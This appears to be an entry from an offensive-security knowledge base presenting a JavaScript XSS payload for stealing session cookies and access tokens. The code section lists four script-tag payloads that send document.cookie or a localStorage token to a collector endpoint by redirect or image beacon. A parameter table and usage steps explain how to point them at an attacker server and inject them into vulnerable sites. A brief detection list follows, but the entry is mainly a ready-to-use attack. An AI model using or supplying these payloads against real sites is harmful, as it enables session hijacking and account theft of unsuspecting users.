---
id: 4bd40ad7-61b4-4307-af6b-b460f762eedb
type: code
language: javascript
verified: true
created_at: '2023-04-06T03:56:41.637823+00:00'
updated_at: '2023-04-10T20:21:43.600851+00:00'
platforms:
  - Web
tags:
  - xss
  - payload
  - credential-theft
validated: true
---

# XSS-Cookie-and-Token-Grabber-JavaScript

## Code

```html
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
```

## Description

This JavaScript payload, injected via XSS, extracts the victim's session cookies from document.cookie and access tokens from localStorage, then exfiltrates them to attacker-controlled URLs using both redirect and beacon methods. The first two scripts use document.location to send data via URL redirects, while the latter two use new Image() to create invisible img elements with src attributes containing the data, allowing asynchronous transmission without disrupting the page.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| http://localhost/XSS/grabber.php | URL for receiving cookie/token data via redirect (replace with attacker endpoint) | http://attacker.com/XSS/grabber.php |
| http://localhost/cookie.php | URL for receiving data via image beacon (replace with attacker endpoint) | http://attacker.com/cookie.php |

## Usage

Embed this payload in a vulnerable XSS input (e.g., URL parameter, form field) on the target site. When a victim loads the page, the scripts execute client-side, sending data to your server. Use in reflected/stored XSS for immediate or persistent theft. Test injection first with benign payloads to confirm vulnerability.

## Detection

- Web Application Firewalls (WAFs) or CSP headers blocking script injection or external fetches.
- Browser dev tools showing unexpected redirects or image loads to external domains.
- Server logs revealing anomalous GET requests with cookie/token data in query strings.
- Endpoint protection monitoring for JavaScript accessing localStorage or document.cookie in untrusted contexts.

## Related

- [[procedures/Exploit-XSS-to-Steal-Cookies-and-Access-Tokens]]
